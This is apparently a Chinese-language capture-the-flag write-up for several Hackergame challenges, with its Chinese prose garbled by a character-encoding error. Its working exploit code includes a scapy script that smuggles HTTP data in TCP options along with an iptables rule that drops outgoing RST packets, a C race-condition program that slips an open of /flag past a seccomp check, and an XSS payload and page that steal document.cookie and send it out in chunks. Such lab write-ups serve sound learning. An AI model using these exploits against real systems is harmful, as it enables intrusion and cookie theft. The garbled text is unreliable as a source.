å°è¯•åæƒŠå–œåœ°å‘ç°ï¼Œå‘é€ SYN åæœåŠ¡å™¨ ACK äº†ï¼ä½†æ˜¯ç”±äºå†…æ ¸çš„ TCP æ ˆæ²¡è§è¿‡æ­£åœ¨ ACK çš„åŒ…ï¼Œä»¥è¿…é›·ä¸åŠæ©è€³çš„é€Ÿåº¦å›äº†ä¸ª RSTï¼Œæ‰€ä»¥æˆ‘åŠ äº†ä¸ªé˜²ç«å¢™è§„åˆ™ drop å‘å‡ºçš„ RSTã€‚

``sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s 192.168.24.3 --dport 18082 -j DROP``

è¿™æ ·å‘é€çš„ GET è¯·æ±‚æœåŠ¡å™¨è¯†åˆ«å¹¶æ­£ç¡®å›å¤äº†ï¼

å½“æˆ‘ä»¥ä¸ºå¤§åŠŸå‘Šæˆæ—¶ï¼Œå‘ç°æŠŠ GET æ¢æˆ POST ä»¥åæœåŠ¡å™¨å¼€å§‹ 400 äº†ã€‚ã€‚ã€‚

åˆ debug äº†åŠå¤©æ‰¾ä¸åˆ°å“ªé‡Œæœ‰é—®é¢˜ï¼Œåªå¥½å†çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ›´ç¬¦åˆæ ‡å‡†çš„æ–¹å¼ï¼Œç„¶åå‘ç° tcp çš„ option æ˜¯å¯ä»¥æ”¾ä»»æ„æ•°æ®çš„ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦æ‰‹æ”¹ data offset äº†ã€‚

```python
from scapy.all import *
import random

HTTP_GET = b"GET / HTTP"
SRC_IP = "192.168.24.3"
SRC_PORT = random.randint(1024, 65535)
DST_IP = "192.168.23.1"
DST_PORT = 18082
TOKEN = ""
HTTP_PAYLOAD = f"POST / HTTP/1.1\r\nHost: {DST_IP}:{DST_PORT}\r\nContent-Length: 99\r\n\r\n{TOKEN}".encode()

ip = IP(src=SRC_IP, dst=DST_IP)
SYN = TCP(
    sport=SRC_PORT, dport=DST_PORT, flags="S", seq=1000, options=[(233, HTTP_GET)]
)
SYNACK = sr1(ip / SYN)

ACK = TCP(
    sport=SRC_PORT,
    dport=DST_PORT,
    flags="A",
    seq=SYN.seq + 1,
    ack=SYNACK.seq + 1,
    options=[(233, HTTP_GET)],
)
send(ip / ACK)

http = TCP(
    sport=SRC_PORT,
    dport=DST_PORT,
    flags="AP",
    seq=SYN.seq + 1,
    ack=SYNACK.seq + 1,
    options=[(233, HTTP_GET)],
)
http.add_payload(HTTP_PAYLOAD)
http.show2()
send(ip / http)
```

## ä¸ºä»€ä¹ˆè¦æ‰“å¼€ /flag

æ˜¯æˆ‘è¿™å±Šæœ€å–œæ¬¢çš„è½»æ¾æ„‰å¿«ä¸ç”¨é€†å‘çš„å° binary é¢˜ã€‚
æ‹¿åˆ°äº†ä¸€è¡€ååˆ†å¼€å¿ƒã€‚

### LD_PRELOAD, love!

LD_PRELOAD åªå¯¹åŠ¨æ€é“¾æ¥ libc çš„æœ‰æ•ˆï¼Œæ‰€ä»¥é™æ€ç¼–è¯‘å°±èƒ½è¿‡ã€‚
æˆ‘çš„è¯ç›´æ¥æ‹¿ go ç³Šäº†ä¸ªã€‚

## éƒ½æ˜¯ seccomp çš„é”™

é¢˜ç›®æ˜¯ç”± ~~[KDEç¨‹åº](https://github.com/USTC-Hackergame/hackergame2022-writeups/blob/master/behind-the-scenes/files/18.png) ä¹‹ä¸€çš„~~å‡ºé¢˜äººçš„ [crate](https://crates.io/crates/greenhook) ä¿®æ”¹çš„ã€‚
crate æè¿°é‡Œè¯´äº†å¯èƒ½è¢« TOCTOU (Time of check to time of use) æ”»å‡»ï¼Œé‚£ä¹ˆåˆ›å»ºä¸€ä¸ªçº¿ç¨‹åˆ›é€  race å³å¯ã€‚
å¦å¤–æ¯”è¾ƒå‘çš„æ˜¯ syscall é™åˆ¶çš„æ¯”è¾ƒä¸¥ï¼Œç”šè‡³ pthread æ‰€ä½¿ç”¨çš„ clone3 éƒ½ä¸è®©ç”¨ã€‚

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sched.h>
#include <string.h>
#include <signal.h>
#include <fcntl.h>

static char file[100];

static int child_func() {
  for (int i = 0; i < 1000000; ++i) {
    strcpy(file, "/fake");
    strcpy(file, "/flag");
  }
  return 0;
}

int main(int argc, char ** argv) {
  const int STACK_SIZE = 65536;
  char *stack = malloc(STACK_SIZE);
  if (!stack) {
    perror("malloc");
    exit(1);
  }

  strcpy(file, "/fake");

  char buffer[100];
  memset(buffer, 0, 100);

  if (clone(child_func, stack + STACK_SIZE, CLONE_VM | SIGCHLD, NULL) == -1) {
    perror("clone");
    exit(1);
  }

  for (int i = 0; i < 1000; ++i) {
    int fd = open(file, O_RDONLY);
    if (fd == -1) {
      perror("open");
      continue;
    }
    read(fd, &buffer, 100);
    printf("read: %s", buffer);
  }
  return 0;
}
```

## å¼‚æ˜Ÿæ­§é€”

å¤§æ¦‚äº†è§£ä¸€ä¸‹æ¸¸æˆçš„å¤„ç†å™¨å°±èƒ½åšï¼Œå¤§ä½“æµç¨‹å°±æ˜¯çœ‹ä»£ç ï¼Œå…‰çœ‹ä»£ç ä¸èƒ½ç¡®å®šçš„å°±å¤šå°è¯•ï¼Œè®°å¾—å¤šå­˜å‡ ä¸ªæ¡£é˜²æ­¢çˆ†ç‚¸ï¼Œ~~è¯´å¤šäº†éƒ½æ˜¯æ³ªã€‚~~

## å¾®ç§¯åˆ†è®¡ç®—å°ç»ƒä¹  2.0

~~éš¾åº¦ä¸Šçœ‹è¿™é¢˜æ‰æ˜¯çœŸæ­£çš„ 2.0ã€‚~~

éšä¾¿ç©ç©ä¼šå‘ç°å¯ä»¥ç”¨ \x escapeï¼Œç”¨åŒå¼•å·å¯ä»¥é€ƒå‡ºå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆåªè¦æƒ³ä¸ªåŠæ³•æŠŠè¦æ‰§è¡Œçš„ payload ä»ä¸€ä¸ªå­—æ•°é™åˆ¶ç›¸å¯¹å®½æ¾çš„åœ°æ–¹ä¼ è¿›å»å³å¯ï¼Œæˆ‘ç”¨çš„æ˜¯ urlã€‚
ä¸è¿‡ç”¨ url çš„è¯ payload é‡Œå°±ä¸èƒ½æœ‰è¢« urlencode çš„å­—ç¬¦äº†ï¼Œæ¯”å¦‚åŒå¼•å·ã€‚

è¯„è®º
```
\x3csvg "+location+"\x3e
```

ç½‘é¡µ
```html
<script>
    function load() {
        window.addEventListener("message", (event) => {
            let flag = event.data;
            const string_to_char_code = ([...string]) => {
                const array = string.map((char) => {
                    return char.charCodeAt(0);
                });
                return array.join(",");
            };
            let part = string_to_char_code(encoded.slice(0, 20));
            window.open(`http://web/result?/onload=f=document.body.firstElementChild.children[3];f.children[1].children[1].value=String.romCharCode(${part});f.children[2].click()`);
        });
        window.open("http://web/result?/onload=window.opener.postMessage(document.cookie,String.fromCharCode(42))");
    }
</script>
<body onload=load()>
```

flag æ¯”è¾ƒé•¿ï¼Œè¦åˆ†å¥½å‡ æ¬¡å‘ã€‚æ‹¿å‡ºæ¥ä»¥åç”¨ CyberChef base64 decode + url decode å³å¯ã€‚

çœ‹å®˜æ–¹ wp æ„Ÿè§‰è‡ªå·±èµ°äº†ä¸å°‘å¼¯è·¯ï¼Œä¸€ä¸ªæ˜¯ä¼  payload å¯ä»¥ç”¨ location.hash æˆ–è€…æ˜¯ nameï¼Œè¿™æ ·å°±ä¸æ¶‰åŠ urlencode é—®é¢˜äº†ã€‚
è¿˜æœ‰å°±æ˜¯æ˜æ˜ä¸ç”¨æŠŠ flag å‘å›æ¥å¤„ç†çš„ï¼Œç”¨è¿™ä¸ª post message æ–¹æ³•æ˜¯æŸ¥æ€ä¹ˆé¿å¼€ cors æ—¶çœ‹åˆ°çš„ï¼Œ~~ä¸çŸ¥ä¸è§‰å°±ç”¨äº†ã€‚~~


## é€†å‘å·¥ç¨‹ä¸éœ€è¦ F5

é¢˜ç›®ä¸‹è½½ä¸‹æ¥çœ‹åˆ°ä¸€å † dllï¼Œç²—ç•¥åˆ†æäº†ä¸€ä¸‹ï¼Œflag é•¿åº¦ä¸å« `flag{}` ä¸€å…± 32 å­—èŠ‚ï¼Œæœ‰äº†è¿™ä¸ªä¿¡æ¯æˆ‘ç›´æ¥ä¸€ä¸ª angr çš„å¯åŠ¨ï¼Œç„¶åç”¨å„ç§å§¿åŠ¿éƒ½æ²¡è·‘å‡ºç»“æœã€‚ã€‚ã€‚
äºæ˜¯æ¢ç”¨ ida çš„ç¬¦å·æ‰§è¡Œæ’ä»¶ ponce åšï¼Œåœ¨ main é‡Œåˆ¤æ–­ä¸æ­£ç¡®çš„åœ°æ–¹ä¸‹æ–­ï¼Œè·‘ 32 æ¬¡å°±èƒ½æŠŠ flag è·‘å‡ºæ¥äº†ã€‚

![è°ƒè¯•](assets/ponce.webp)

å®˜æ–¹é¢˜è§£æä¾›äº† angr è„šæœ¬ï¼Œhook äº† input éƒ¨åˆ†ï¼Œæˆ‘æ²¡è·‘å‡ºç»“æœå¤§æ¦‚æ˜¯ç¢°ä¸Š angr çš„ scanf bug äº†ã€‚

## å…³äºæ²¡åšå‡ºçš„é¢˜ç›®

### O(1) ç”¨æˆ·ç™»å½•ç³»ç»Ÿ

è€ƒè™‘è¿‡ merkle tree çš„ second preimage attackï¼Œä½†æ˜¯è¾“å…¥éƒ¨åˆ†ä¸åƒèƒ½æŠŠ admin:password çš„çˆ¶èŠ‚ç‚¹ç›´æ¥æ’å…¥çš„æ ·å­ã€‚
å®Œå…¨æ²¡æƒ³åˆ°æ„é€ ç¬¦åˆæ¡ä»¶çš„ hash èƒ½å¾ˆå¿«ã€‚

### å° Z çš„è°œé¢˜

å°è¯•äº† z3 æ±‚è§£å’Œç”¨ c++ é‡å†™åç¬¦å·æ‰§è¡Œï¼Œä¼°è®¡å“ªé‡Œå†™å‡º bug äº†ï¼Œéƒ½æ˜¯ unsatï¼Œæ²¡æ—¶é—´ debug äº†åªå¥½æ”¾å¼ƒã€‚